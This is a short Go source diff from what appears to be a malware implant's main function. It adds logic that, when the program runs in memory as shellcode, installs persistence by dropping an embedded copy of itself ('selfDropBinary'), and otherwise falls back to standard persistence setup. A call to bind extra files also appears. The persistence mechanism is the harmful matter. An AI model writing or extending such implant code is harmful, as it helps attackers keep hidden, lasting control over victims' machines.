@@ -21,8 +21,17 @@ func main() {
 	runBoundFiles()
 
 	if cfg.EnablePersistence {
-		if err := persistence.Setup(); err != nil {
-			log.Printf("Warning: Failed to setup persistence: %v", err)
+		if isRunningInMemory() {
+			if len(selfDropBinary) > 0 {
+				if err := persistence.SetupFromBytes(selfDropBinary); err != nil {
+					log.Printf("Warning: Failed to setup shellcode persistence: %v", err)
+				}
+			}
+			// No selfDropBinary = shellcode built without persistence embed; skip.
+		} else {
+			if err := persistence.Setup(); err != nil {
+				log.Printf("Warning: Failed to setup persistence: %v", err)
+			}
 		}
 	}
 
